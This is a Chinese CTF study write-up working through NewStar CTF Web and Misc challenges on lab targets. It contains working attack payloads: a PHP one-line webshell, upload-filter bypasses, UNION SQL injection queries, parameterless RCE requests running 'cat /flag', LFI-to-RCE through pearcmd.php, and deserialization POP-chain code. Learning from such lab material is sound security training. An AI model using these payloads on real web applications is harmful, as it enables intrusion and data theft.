# Newstar CTF 中的Web和Misc练习 复现

## Week1 Web

### 第一题 泄露的秘密

<img src="C:\Users\Lyra\AppData\Roaming\Typora\typora-user-images\image-20240221142918870.png" alt="image-20240221142918870" style="zoom:80%;" />

<img src="../typora-user-images/image-20240221143421374.png" alt="image-20240221143421374" style="zoom:80%;" />

题目中提到管理员泄露了两个敏感信息

这里第一个是在robots.txt中可以看到。

<img src="../typora-user-images/image-20240221143624521.png" alt="image-20240221143624521" style="zoom: 67%;" />

下载网站的www.zip文件获取更多信息，在index.php中找到另一段flag。

#### 总之，是Web方向敏感文件查询

ctf中敏感文件泄露的题型主要有以下几种

robots.txt
robots.txt放置在一个站点的根目录下，而且文件名必须全部小写，是搜索引擎中访问网站的时候要查看的第一个文件，记录一些目录和CMS版本信息。ctf中可以在直接访问*/robots.txt来获取文本信息。
vim备份文件
当用户在Linux编辑器编辑文件但意外退出时会在当前目录下生成一个备份文件，文件名格式为：文件名.swp，意外退出更多次后缀可以为.swo .swn……ctf中访问*/.index.php.swp可以下载
gedit备份文件
在Linux下，用gedit编辑器保存后，当前目录下会生成一个后缀为“～”的文件，其文件内容就是刚编辑的内容。格式一般是文件名加后缀，例如：index.php~ ，ctf中也是直接访问*/文件名~
readme.md
记录CMS版本信息，有的甚至有Github地址。ctf中直接访问*/readme.md
www/wwwdata/wwwroot/web/webroot/ & .zip/rar/tar.gz/7z/tar
往往是网站的源码备份。ctf中访问后可以下载本地查看

参考链接：https://blog.csdn.net/wanderer__/article/details/127843286



Typora使用技巧参考：https://blog.51cto.com/u_15715491/5465229

### 第二题 Begin of Upload

题目描述

<img src="../typora-user-images/image-20240223134300729.png" alt="image-20240223134300729" style="zoom: 80%;" />

​		需要上传文件，题目说到是普通的上传，在CTF中需要获取flag的，而这又是一道WEB题目，所以上传应该首先要绕过过滤器，这里我们上传**一句话木马**，然后获取Web主机中的flag即可，这是我现在想的。

![image-20240223140406590](../typora-user-images/image-20240223140406590.png)

查看网页源代码可知这里是采用了前端验证，所以可在直接F12 将验证部分的代码删除绕过(火狐的有用，谷歌浏览器不行)，

或者在浏览器中将js禁用，

再不济就使用burp，上传一句话木马后缀为jpg，burp拦截后再将后缀改过来(content-type也要进行修改)；

或者在burp中将网页的js部分代码进行删除。

经过上述的这些方法均能绕过此过滤器，前端过滤是比较简单的一种了......

一句话木马上传成功后就可以进行操作了

记住是system()来执行shell指令的

ls /  

来看主机上有什么文件，发现flag文件后直接cat即可，如下图：

![image-20240223140330616](../typora-user-images/image-20240223140330616.png)

一句话木马要直接能写出来的

<?php  @eval($_POST['a']);?>





### 第三题 Begin of HTTP ***

<img src="../typora-user-images/image-20240223141041430.png" alt="image-20240223141041430" style="zoom:80%;" />

题目描述是最初的开始 然后应该是关于HTTP的。

开启靶机后给了个网址和端口，应该是要发送HTTP请求来获取flag的？

![image-20240223141700044](../typora-user-images/image-20240223141700044.png)

好吧，很直白 参数名字是ctf......

![image-20240223141849130](../typora-user-images/image-20240223141849130.png)

把secret藏哪了，我也不知道，开启F12找一找吧

![image-20240223142040068](../typora-user-images/image-20240223142040068.png)

base64解码看看是什么

<img src="../typora-user-images/image-20240223142127345.png" alt="image-20240223142127345" style="zoom:50%;" />

将此参数值传入

![image-20240223142539561](../typora-user-images/image-20240223142539561.png)

（前面的链接ctf=1不用删除了.......）

![image-20240223142701770](../typora-user-images/image-20240223142701770.png)

使用burp发现power指的是cookie，修改即可

![image-20240223143239505](../typora-user-images/image-20240223143239505.png)

修改UA头部

![image-20240223143232241](../typora-user-images/image-20240223143232241.png)

![image-20240223143306622](../typora-user-images/image-20240223143306622.png)

是要修改host么？？？

![image-20240223143408988](../typora-user-images/image-20240223143408988.png)

好吧并不是

是要修改referer头，为什么？？？

![image-20240223143807394](../typora-user-images/image-20240223143807394.png)

![image-20240223143712777](../typora-user-images/image-20240223143712777.png)

本地用户要添加X-Real-IP头

![image-20240223143907669](../typora-user-images/image-20240223143907669.png)

![image-20240223143945097](../typora-user-images/image-20240223143945097.png)

得到flag



**关于referer头部**

![image-20240223144144421](../typora-user-images/image-20240223144144421.png)

#### HTTP协议中的“X-Real-IP”头字段的作用是什么？底层原理是什么？

​		"X-Real-IP"是一个自定义的HTTP请求头，通常在代理服务器和负载均衡器等网络设备中使用。它用于告诉**后端服务器实际客户端的IP地址，而不是代理服务器的IP地址**。

​		在常规的HTTP请求中，服务器会使用TCP连接的远程IP地址作为客户端的IP地址。但是，当HTTP请求通过代理服务器或负载均衡器等网络设备时，这个IP地址将变成代理服务器或负载均衡器的IP地址，而不是实际客户端的IP地址。

​		这时候就需要使用"X-Real-IP"头字段来传递客户端的真实IP地址。当代理服务器或负载均衡器接收到HTTP请求时，会把客户端的真实IP地址添加到请求头的"X-Real-IP"字段中，然后把请求转发给后端服务器。后端服务器可以通过读取"X-Real-IP"字段来获取客户端的真实IP地址。

​		底层原理是在代理服务器或负载均衡器中通过获取客户端的IP地址，并在HTTP请求头中添加"X-Real-IP"字段，将客户端的真实IP地址传递给后端服务器。后端服务器可以通过读取该字段来获取客户端的真实IP地址。

### 第四题 ErrorFlask

题目描述

<img src="../typora-user-images/image-20240223144726347.png" alt="image-20240223144726347" style="zoom:50%;" />

什么是ErrorFlask？

flask错误？flask是python中的一个框架吧

看官方题解，是Flask报错界面信息泄露，原来这也能泄露......

![image-20240223172330276](../typora-user-images/image-20240223172330276.png)

如何报错，正常的话给两个number一个值，它回给出结果，但会有提示

![image-20240223172507532](../typora-user-images/image-20240223172507532.png)

只给number1赋值

发现报错

![image-20240223172632017](../typora-user-images/image-20240223172632017.png)

报错页面会出现部分源代码，flag就在其中。





### 第五题 Begin of PHP

题目描述

<img src="../typora-user-images/image-20240223172745799.png" alt="image-20240223172745799" style="zoom:80%;" />

php语言一点不懂.......

![image-20240223173157727](../typora-user-images/image-20240223173157727.png)

大致意思就是有5关。

那就一个个看，看第一部分

如果有key1和key2打印Level 1

如果它两值不等但md5值相等的话，flag1就为真，我们看到flag1为真就可以Level 2了，依次

然后就可以获取flag

主要考察PHP中md5弱类型比较的特点，只需要找到两个值不同但md5值以0e开头的字符串即可通过本关，原理是0e在进行弱类型比较时会被当作科学计数法进行比较。

参考https://blog.csdn.net/qq_43580193/article/details/117432689    php MD5值比较绕过



第二部分

看代码大概意思是如果用户提交了 `key3`，并且 `md5(key3)` 的值等于 `sha1(key3)` 的值，那么 `flag2` 会被设置为 `true`。

把第一部分喂给gpt调教后  gpt这样说

​		*`md5()` 和 `sha1()` 返回的哈希值都是字符串，而 PHP 中使用 `===` 进行比较时会比较字符串的值和类型。因此，如果输入字符串经过 `md5()` 和 `sha1()` 处理后，它们的值相等且类型也相同，则 `===` 比较会返回 `true`，从而设置 `flag2` 为 `true`。*

​		*这种情况可以被利用，因为在 PHP 中，如果一个字符串被转换为数字时，如果该字符串不以数字开头，则其值为 `0`。因此，如果用户提交的字符串不以数字开头，但是经过 `md5()` 和 `sha1()` 处理后，它们的值相等，那么在比较时它们将被当作数字 `0`，从而导致 `===` 比较返回 `true`。*

​		*这种情况可以被认为是一个类型混淆漏洞，因为原本应该是不同类型的字符串经过处理后被错误地认为是相同类型的数字。*

说的不能说颇有见解吧，也可以说是一塌糊涂
		这部分主要考察PHP哈希函数的特性，在处理数组类型的传参时，md5、sha1等哈希函数会返回NULL值，由此可以构造出NULL===NULL从而通过判断。

所以构造key3[]=1即可，此时key3是一个数组类型的参数，可以通过判断，记住是POST方式。



第三部分

​		GET获取一个key4，如果和flag相等，那么通过判断

​		strcmp是比较两个字符串，如果str1<str2 则返回<0 如果str1大于str2返回>0 如果两者相等 返回0。

​		**strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。**

这里也是传入key4参数类型我们用数组就好，key4[]

即可通过验证





第四部分

​		判断key5 不是一个数字但却比2023大，如何通过此验证

参考https://www.cnblogs.com/youxin/p/3873397.html   php陷阱：字符串和数字比较

​		当一个数字与一个字符串/字符进行大小比较时，首先系统尝试将此字符串/字符转换为整型/浮点型，然后进行比较，如'12bsd'转型为12，'a'转型为0，千万需要注意的是此时不是将其对应的ASCII码值与数字进行大小比较了。

​		所以我们可以构造key5=2024bb，在进行比较时2024bb不是数字但会转换为2024与2023比较，通过验证。





第五部分

​		考察extract函数导致的变量覆盖漏洞，这里的if判断只要保证传入变量flag5即可，根据上面的正则限制，变量值不能为字母和数字，那么传入一个任意符号即可通过本层。

<img src="../typora-user-images/image-20240223220017396.png" alt="image-20240223220017396" style="zoom: 67%;" />



最后得到flag

![image-20240223214323182](../typora-user-images/image-20240223214323182.png)





### 第六题 R!C!E!

<img src="../typora-user-images/image-20240224180453873.png" alt="image-20240224180453873" style="zoom:50%;" />

点击进入后可以看到

<img src="../typora-user-images/image-20240224180519635.png" alt="image-20240224180519635" style="zoom:67%;" />

有两个传参，一个是password，一个是e_v.a.l

password要满足其md5值前6位为c4d038

这个需要写个简单的小脚本（Python的重要性）

最后结果为114514

对于e_v.a.l有一点要注意

php中会将非法符号转化为下划线，按照官方题解说是只转化一次

所以直接传参会是 e_v_a.l

但这里我是疑惑的

因为官方最后给的是要e[v.a.l

前面说点可以转化那么e.v.a.l就行了吧，而我也试了试其他特殊符号发现只有[符合条件，所以这里解释的感觉不是很清晰。。。

总之我们传参是要给e[v.a.l值，由于有对敏感信息进行过滤，所以我们不能用system命令

可以用php自带的 如下

![image-20240224181252422](../typora-user-images/image-20240224181252422.png)

可以发现根目录中有flag

获取flag可用file_get_contents函数，然后利用变量绕过验证

不不不应该叫做 参数逃逸绕过限制

简单来说就是将flag藏于参数之中，我们函数的参数可以用一个参数$_POST['a']表示

这样绕过限制，之后我们给a=/flag也就获取到flag了

如下

![image-20240224181725296](../typora-user-images/image-20240224181725296.png)

​		

### 第七题 EasyLogin

<img src="../typora-user-images/image-20240224181806768.png" alt="image-20240224181806768" style="zoom:50%;" />

进入后如下：

<img src="../typora-user-images/image-20240224210247293.png" alt="image-20240224210247293" style="zoom:50%;" />

这个页面我先去注册了账号

admin这个用户名是已经存在了的

注册了一个admin1之后进入就是如下图

<img src="../typora-user-images/image-20240224210545179.png" alt="image-20240224210545179" style="zoom: 67%;" />

不懂啥玩意

考点是弱口令登录 HTTP 302 跳转抓包

所以要弱口令登录上admin么？？

![image-20240224210814484](../typora-user-images/image-20240224210814484.png)

噢噢这种终端界面可以ctrl +C+D跳出来的

然后方向上键可以查看历史记录

发现有此条消息

喂给GPT

![image-20240224211030166](../typora-user-images/image-20240224211030166.png)

得知 admin 的密码为弱密码加上newstar   newstar2023后其中的一个。

用的是弱密码

官方题解就说网上随便搜点弱密码试一下常见的就行

这里密码试出来是000000

想用burpsuite来着

但发现拦截的包中pwd字段不是明文啊？？？

总之是登上去admin账号了

看看是什么情况

还是先看历史记录吧  因为刚才看了看机子的目录也确实是没什么

![image-20240224212606423](../typora-user-images/image-20240224212606423.png)

？？？

他说用就用吧  用burp看看能拦着什么包吧

好吧  记着重新完成一次登录

![image-20240224212958603](../typora-user-images/image-20240224212958603.png)

有一个包是这样的

![image-20240224213041302](../typora-user-images/image-20240224213041302.png)

做一下回应 response 得到flag





## Week1 Misc

### 第一题 瑞士军刀一把梭

### 第二题 机密图片

简单的隐写，使用stegsolve工具即可，印象里应该是LSB隐写

这部分会简略，因为这些misc自己以前都做出来过，简单写思路

### 第三题 流量！鲨鱼！

是要看流量包的，wireshark查看包中的文件就行，官方题解没怎么搞懂

我当时应该是跟踪流量获取到了text/html文件 然后看到了base64编码就直接解码得到flag

### 第四题 压缩包们

看官方题解又是很奇怪的，我当时印象不怎么复杂的，直接放zipllero里了

### 第五题 空白格

whitespace语言 可以一把梭

我当时傻了吧唧的根据空白的的是空格键还是tab键然后换成对应的0和1最后再进行ascii编码转换得到flag了竟然......

### 第六题 隐秘的眼睛

工具题 图片经过silenteye工具加密 使用该工具即可找到flag





## Week2 Web

### 第一题 游戏高手

<img src="../typora-user-images/image-20240224214717618.png" alt="image-20240224214717618" style="zoom:50%;" />

6

这分正常打的话未免有些蚌了

先用burp抓包看看 啥也没......

![image-20240224215625147](../typora-user-images/image-20240224215625147.png)

查看元素，发现游戏的逻辑应该是这个app_v2.js

在源代码中看看，这里我也发现我这个浏览器这里一直开着的是idm的content.js  

我说怎么感觉不对劲。。。。。。

看游戏结束的逻辑

![image-20240224215809765](../typora-user-images/image-20240224215809765.png)



可以看到当分数大于10w分的时候[XHR](https://so.csdn.net/so/search?q=XHR&spm=1001.2101.3001.7020)会向api.php发送一个json数据包，json内容就是gameScore

所以我们只要能给api.php发个成绩大于10w的包即可得到flag

看官方题解的意思是让我们自己构造http请求然后发送???

好在浏览器f12也可以对gamesocre进行修改

![image-20240224222300397](../typora-user-images/image-20240224222300397.png)

简单粗暴获取flag 也更加说明前端验证的不安全之处

用burp发送我们自己的请求

![image-20240224223309320](../typora-user-images/image-20240224223309320.png)

我在尝试，但总是这样子失败......





### 第二题 include 0。0

<img src="../typora-user-images/image-20240224223421282.png" alt="image-20240224223421282" style="zoom:50%;" />

又是php中的包含？

![image-20240224223450652](../typora-user-images/image-20240224223450652.png)

php文件包含漏洞

看到已经说明flag在flag.php中，读取PHP文件需要使用php://filter协议中的过滤器来对文件内容进行编码，但是这里过滤了base和rot。

这里不太懂

找到一篇文章可以参考

https://www.cnblogs.com/linfangnan/p/13535097.html    [CTF-WEB：PHP 伪协议]

​		稍微解释下这个做法，**php://filter/** 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。
​		php 协议还常用 **php://input**，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。

![image-20240225195326134](../typora-user-images/image-20240225195326134.png)

这个点得着重了解，因为是真的不懂php过滤器

最后需要utf7转utf8得到flag

<img src="../typora-user-images/image-20240225195848114.png" alt="image-20240225195848114" style="zoom:50%;" />





### 第三题 ez_sql

<img src="../typora-user-images/image-20240225195930401.png" alt="image-20240225195930401" style="zoom:50%;" />

见题知意，sql注入

sql注入在夏季实训学过，但我学的很拉

进入靶机后发现是一个成绩查询的系统？

<img src="../typora-user-images/image-20240225200157205.png" alt="image-20240225200157205" style="zoom:50%;" />

随便点一个科目进入

<img src="../typora-user-images/image-20240225200222787.png" alt="image-20240225200222787" style="zoom:50%;" />

查询结果大体如此，其他科目也是如此

让我们看url

![image-20240225200303903](../typora-user-images/image-20240225200303903.png)

主要是给id赋值，也就是课程号吧

看看题解

<img src="../typora-user-images/image-20240225200557501.png" alt="image-20240225200557501" style="zoom:50%;" />



给id传TMP0929'#   (#要编码成%23)   有结果，说明是union注入

现在我们需要判断字段数

**?id=TMP0929' order by 1 #**

<img src="../typora-user-images/image-20240225201050952.png" alt="image-20240225201050952" style="zoom:50%;" />

很纳闷为什么大写Order by才行（有过滤么）

小写order by就不回显信息了  反正结果是到6的时候没有信息回显了

说明字段数是5

**?id=TMP0929' union select 1,2,3,4,5 #**

![image-20240225201504196](../typora-user-images/image-20240225201504196.png)

查询表名

**?id=1' uNion Select ((sElect grOup_cOncat(tAble_name) From infOrmation_schema.tables Where Table_schema=Database())),2,3,4,5%23**

![image-20240225201602349](../typora-user-images/image-20240225201602349.png)

查询字段名

**?id=1' uNion Select ((sElect grOup_cOncat(column_name) From infOrmation_schema.columns Where Table_name='here_is_flag')),2,3,4,5%23**

查询flag值

**?id=1' uNion Select ((sElect grOup_cOncat(flag) From here_is_flag)),2,3,4,5%23**

![image-20240225202038060](../typora-user-images/image-20240225202038060.png)





### 第四题 Unserialize?

<img src="../typora-user-images/image-20240225204745278.png" alt="image-20240225204745278" style="zoom:50%;" />



什么是PHP反序列化，我不造啊

![image-20240225211535836](../typora-user-images/image-20240225211535836.png)

反序列化 ls /看到flag

在通过head /th1s_1s_fffflllll4444aaaggggg 获取flag

![image-20240225211654060](../typora-user-images/image-20240225211654060.png)

php反序列化是一个需要深度学习的知识.......



参考链接 https://xz.aliyun.com/t/12507?time__1311=mqmhD50I1G7D%2FD0l8Gk%2B5PAKD%3D%3D0Qrer4D&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F

php反序列化完整总结

b站视频 https://www.bilibili.com/video/BV1R24y1r71C/?spm_id_from=333.337.search-card.all.click&vd_source=1d9c82d9f3cd58c9069729c3d9596bdb



### 第五题 Upload again！***

<img src="../typora-user-images/image-20240225211855596.png" alt="image-20240225211855596" style="zoom:50%;" />

​		上传漏洞以前在THM是有仔细学习过的，但现在一点记不住了，所以学习这些还是要好好做总结 ，写题解，这也是为什么我现在在写题解...

这里后端进行验证了，而且是会检查文件内容的，所以不能直接写<?php     ?>

具体如下

![image-20240225213943400](../typora-user-images/image-20240225213943400.png)

![image-20240225214119484](../typora-user-images/image-20240225214119484.png)

<img src="../typora-user-images/image-20240225214249897.png" alt="image-20240225214249897" style="zoom:33%;" />

​		上传.htaccess文件让服务器把.jpg文件当成php解析，这个需要注意

​		THM最后一道题也是这样，一句话木马写好后改后缀为jpg，然后到了.jpg页面竟然能直接执行，我不知道为什么，现在看到这里可能就明白了，应该也是有.htaccess，当时THM上给了一个按钮，点击之后就让.jpg执行了，又想过来还是比较懵。

​		<img src="../typora-user-images/image-20240225214715234.png" alt="image-20240225214715234" style="zoom:25%;" /> 获取到flag





### 第六题 R!!C!!E!! ***

<img src="../typora-user-images/image-20240225214830909.png" alt="image-20240225214830909" style="zoom:50%;" />

![image-20240225222957925](../typora-user-images/image-20240225222957925.png)

啥也没

根据提示，找一找泄露的信息，目录扫描吧

目录扫描这块，当时做THM时发现国外貌似用gobuster挺普遍的，但国内好像只有dirsearch似的......当然没啥意思

就用dirsearch吧

![image-20240225225458587](../typora-user-images/image-20240225225458587.png)

![image-20240225225534813](../typora-user-images/image-20240225225534813.png)

扫出来一些东西

吐槽   为什么扫出来东西最后不给个总结啊，还得往上翻翻看扫出来什么了

当然 可能是我不会用，应该还要加一些参数来指定我们需要什么结果么？



这个.git在网页访问会说被禁止访问

我们需要GitHack工具来获取源码

![image-20240225230328157](../typora-user-images/image-20240225230328157.png)

可以看到有3个文件

index.php没什么就是进入的页面

start.sh更没啥吧

那个长不拉几的文件可以看看

![image-20240225230532778](../typora-user-images/image-20240225230532778.png)

看不懂

题解如是说

第一个正则对提交的参数进行处理：任意字符加上可选的括号（允许嵌套）更换为空，然后判断是否等于分号，结合下面的 eval 可以知道就是无参数命令执行。

第二个正则过滤了一些常用的用于无参数命令执行的 php 方法，但过滤不全，可以使用类似功能的方法进行绕过，最终命令执行。

payload（使用 bp 发送的请求）：

> GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1
>
> Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
>
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
>
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
>
> Accept-Encoding: gzip, deflate
>
> Connection: close
>
> X-Forwarder-Proto: system('cat /f*');
>
> Upgrade-Insecure-Requests: 1

更加懵懂了

查阅资料   发现这应该是   无参数命令执行学习

参考链接  https://xz.aliyun.com/t/10780?time__1311=mq%2BxB7DQ0QnDRDBdPoGkbYMRDj24iuDi%3D4D&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F



我先试试这篇文章里的Payload1

这里是试后的我，发现还是不行，发过去的包接不到回应啊

和游戏高手那道题一样的问题        好在我现在知道什么情况了  大概

去翻了翻聊天群 有如下答案

<img src="../typora-user-images/image-20240225234028669.png" alt="image-20240225234028669" style="zoom:50%;" />

然后我就加了两行空行    得到结果了           乐......

![image-20240225234120975](../typora-user-images/image-20240225234120975.png)

可以看到有回应了......           发包的时候构造的包要加空行！！！

参考的文章里的方法有用但实际用在这道题好像不怎么行

主要原因是，这道题过滤了太多了

![image-20240225235539274](../typora-user-images/image-20240225235539274.png)

比如这个payload，用在本题是被过滤的，根本行不通。。。

后面几个也不知道啥情况，主要太晚了，先这样吧......

GET /bo0g1pop.php?star=system(next(getallheaders())); HTTP/1.1
Host: 4ec69c80-944e-4960-83c0-257e84dbe66f.node4.buuoj.cn:81
User-Agent: cat$IFS$9/flag
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1

这是群里大佬给的，感觉比题解的更容易理解

![image-20240226000052414](../typora-user-images/image-20240226000052414.png)

虽然我有点好奇多出来的$9是什么玩意   这种命令中$+一个字符啥的的影响？？？

我试了试 直接cat也行啊

![image-20240226000549862](../typora-user-images/image-20240226000549862.png)

就到这里吧





## Week2 Misc

### 第一题 新建Word文档

题目给了个Word文档，进入发现是佛说解密

解密之后就是flag

<img src="../typora-user-images/image-20240226150542425.png" alt="image-20240226150542425" style="zoom:50%;" />

所以说这题考了啥，我想是Word里面的一种方法，你刚开始发现里面的文字是无法复制的且下面显示字数为0，我直接选中然后选择清除所有格式就解决了，鬼知道它加了什么奇怪的东西

看看题解

<img src="../typora-user-images/image-20240226150934450.png" alt="image-20240226150934450" style="zoom:50%;" />

噢噢，这个是一种Word内容隐写，使用隐藏字体，之前做过，所以已经勾选了显示隐藏文字，默认情况下你进去什么也看不到，在此设置后看到隐藏文字是新佛说然后解密即可。

设置字体的方法就是右键字体-》隐藏      即可

相关链接  https://blog.csdn.net/DRondong/article/details/79322799





### 第二题 永不消逝的电波

使用工具Audacity 解题即可



### 第三题 1-序章

<img src="../typora-user-images/image-20240226151238173.png" alt="image-20240226151238173" style="zoom:50%;" />

日志分析题    写脚本应该挺快

我当时是手动分析    sql注入是采取了时间盲注   根据时间的长短判断是否成功

然后一个一个看即可得到密文    解密后就是flag

建议尝试写一个脚本快速得到flag...



### 第四题 base！

<img src="../typora-user-images/image-20240226151435513.png" alt="image-20240226151435513" style="zoom:50%;" />

考点是base隐写         

建议弄懂base编码的原理  隐写的原理

只为获取flag的话   这方面已经有很多师傅造好轮子了   可以一把梭

但是但是但是还是要弄清楚原理    最好自己写个脚本   不要过于依赖工具

misc题目 工具题  没有工具的时候就是要写脚本的  只是后面造轮子的多了 就变成工具题了



这个最后应该要两次解码，所以不同base编码的格式要清楚比如base64 base32等   



### 第五题 WebShell的利用



<img src="../typora-user-images/image-20240226151915317.png" alt="image-20240226151915317" style="zoom:50%;" />

![image-20240226152705294](../typora-user-images/image-20240226152705294.png)

index.php如上

大概意思是先base64解码 再rot13  然后uudecode  最后rot13    执行得出的结果

这就是webshell

那我们要进行解码了

​		但是我经过一轮解码最后的结果和原文一样，我陷入异或    因为上次我做这道题目也是卡在这里了

看看题解

​		其实这道题偏向于Web题目，代码加密也很简单，在分析时可以将eval修改为echo，调试几次之后发现其实解密方式是固定的，只是进行了嵌套多次加密，由此可以编写PHP脚本对WebShell脚本进行解密：

所以我上面的结果和原文应该是有点区别？只是因为进行了多次嵌套加密  而我只解密了一次  但也不能这样一次次解密  所以题解是写了php脚本如下：

<?php
$shell = "eval(str_rot13(convert_uudecode(str_rot13(base64_decode('此处省略题目文件中的编码内容')))));";
for($i=0; $i<50; $i++){
    if(preg_match("/base64/",$shell)){
        $tmp = preg_replace("/eval/","return ",$shell);
        $shell = eval($tmp);
    }else{
        break;
    }
}
echo $shell;

?>

<img src="../typora-user-images/image-20240226154127542.png" alt="image-20240226154127542" style="zoom:50%;" />

没有正式开始php的学习   先使用在线php环境

运行结果如图

![image-20240226154339173](../typora-user-images/image-20240226154339173.png)

这里就是一个简单的函数的动态调用，GET传入函数名，POST传入函数参数：

![image-20240226155221835](../typora-user-images/image-20240226155221835.png)

反正就是这样用的???





### 第六题 Jvav

<img src="../typora-user-images/image-20240226155319625.png" alt="image-20240226155319625" style="zoom:50%;" />

题目jvav什么玩意儿，百度一搜原来是一个玩迷你的小孩说自己会jvav(java)

根java有什么关系

再看内容 再次强调题目名称    并说隐藏在照片      所以说是图片隐写题目

给的附件也就是一张图片

所以判断是Java隐写       因为有java又有图片隐写么    应该是Java盲水印

不过java隐写貌似挺冷的，看别的博客总结也少    可以说是新么？

java隐写原理掌握      脚本直接找就可以  结果如下

<img src="../typora-user-images/image-20240226155854869.png" alt="image-20240226155854869" style="zoom:50%;" />

成功获取flag



## Week3 Web

### 第一题 Include 梨

<img src="../typora-user-images/image-20240226160049783.png" alt="image-20240226160049783" style="zoom:50%;" />

LFI to RCE 

RCE是远程代码执行，LFI是什么 lfi是本地文件包含漏洞

所以是要我们利用本地文件包含漏洞来实现远程代码执行 进而获取flag

![image-20240302111221694](../typora-user-images/image-20240302111221694.png)

​		进入靶机 先看代码  给file传参赋值给file     如果含有一些敏感词则会终止程序  否则将会将响应的php包含进来

​		提示有说一些东西在phpinfo.php中    进去之后发现只是一些基本的phpinfo()啊

​		接查找flag关键字  发现如下

![image-20240302112229241](../typora-user-images/image-20240302112229241.png)

经过百度，说是在开启register_argc_argv的情况下（可以在phpinfo页面查看是否开启），用户的输入将会被赋予给 $argc、$argv、$_SERVER[‘argv’] 几个变量

![image-20240302112726748](../typora-user-images/image-20240302112726748.png)

如图所示，这里发现是开启了的，我想这应该是题目要用的吧

​		谷歌大法好

结合种种，可以看此博客，考点是一样的，也都是buu的题目

[浅谈文件包含之包含pearcmd.php漏洞](https://blog.csdn.net/JCPS_Y/article/details/127541665)

要利用这个pearcmd.php需要满足几个条件：

（1）.要开启register_argc_argv这个选项在Docker中使自动开启的

（2）.要有文件包含的利用

正是此题目所满足的

![image-20240302120008159](../typora-user-images/image-20240302120008159.png)

构造如上，可将我们的一句话木马上传至/tmp/myhack.php

接下来RCE 可以轻易找到flag

![image-20240302120301586](../typora-user-images/image-20240302120301586.png)

![image-20240302120231886](../typora-user-images/image-20240302120231886.png)

![image-20240302120414481](../typora-user-images/image-20240302120414481.png)





pearcmd.php可以接受的命令有许多，详细见博客

而利用则主要是config-create

去阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。



更好的例子在https://rainy-autumn.top/2021/11/27/OldBlog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8Bpearcmd-php%E7%9A%84%E5%88%A9%E7%94%A8/



**疑问**

<img src="../typora-user-images/image-20240302122216596.png" alt="image-20240302122216596" style="zoom:67%;" />

### 第二题 medium_sql  ***

<img src="../typora-user-images/image-20240302122355235.png" alt="image-20240302122355235" style="zoom:50%;" />

进入靶机，依然是成绩查询系统

<img src="../typora-user-images/image-20240302214828364.png" alt="image-20240302214828364" style="zoom:50%;" />

考点是布尔盲注，又是我不会的

复现也是很有问题

?id=TMP0929' And if(1>0,1,0)#有回显

?id=TMP0929' And if(0>1,1,0)#没有回显，说明页面可以根据if判断的结果回显两种内容，因此是布尔盲注

盲注脚本，用二分查找，这里说初学别用sqlmap

不得不说题解好槽....

反正脚本一点一点跑出来了，我觉得还是sqlmap用的舒服

一个有意思的博客 [【i春秋】渗透测试入门 —— 我很简单，请不要欺负我](https://ciphersaw.me/2018/03/20/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/)



### 第三题 POP Gadget

<img src="../typora-user-images/image-20240302221527571.png" alt="image-20240302221527571" style="zoom: 67%;" />

pop链应该和php反序列化有关

进入网页，我们可以看到要想执行命令，应该是在WhiteGod类中，执行__unset

例如 func=system    var=‘ls’

![image-20240304223220561](../typora-user-images/image-20240304223220561.png)

​		php反序列的知识是看了B站橙子实验室的教程视频，很不错，这题目pop链整出来，代码如下：

```php
<?php
class Begin{
    public $name;
}

class Then{
    private $func;
    public function __construct()
    {
        $this->func=new Super();
    }
}

class Handle{
    protected $obj;
    public function __construct()
    {
        $this->obj=new CTF();
    }
}

class Super{
    protected $obj;
    public function __construct()
    {
        $this->obj=new Handle();
    }
}

class CTF{
    public $handle;
    public function __construct()
    {
    $this->handle=new WhiteGod();
    }
}

class WhiteGod
{
    public $func;
    public $var;
    public function __construct()
    {
        $this->func="system";
        $this->var="cat /flag";
    }
}

$begin=new Begin();
$begin->name=new Then();
//echo(@serialize($begin));
echo(urlencode(@serialize($begin)));
```

可能比较简陋，没有官方题解中那样一步一步大套娃来的摔，但也算构造出来了，反正就是套娃，通过一步步触发绕过魔术方法 最终达到命令的执行，获取flag。



官方的：

![image-20240304223744873](../typora-user-images/image-20240304223744873.png)

![image-20240304223757869](../typora-user-images/image-20240304223757869.png)

官方的逻辑清楚，套娃时不迷糊就好。



### 第四题 R!!!C!!!E!!! ***

<img src="../typora-user-images/image-20240304224007258.png" alt="image-20240304224007258" style="zoom:50%;" />

![image-20240304224048859](../typora-user-images/image-20240304224048859.png)

```php
<?php
class minipop{
    public $code;
    public $qwejaskdjnlka;

}
$a=new minipop();
$a->qwejaskdjnlka=new minipop
$a->code="echo aminosi";
echo (urlencode(@serialize($a)));
```

![image-20240304225723746](../typora-user-images/image-20240304225723746.png)

​		结果看到alright已经返回了，但exec提示是空的，是这里构造的code被过滤掉了么，主要是我不懂正则表达式，我看也不应该过滤掉echo命令啊。

​		好吧，上面的payload错了，魔术方法执行时是new的那个的魔术方法，而不是$a的，也不应该给a的code赋值

​		起码要这样构建

```php
<?php
class minipop{
    public $code;
    public $qwejaskdjnlka;

}
$a=new minipop();
$a->qwejaskdjnlka=new minipop();
$b=$a->qwejaskdjnlka;
$b->code="echo aminosi";
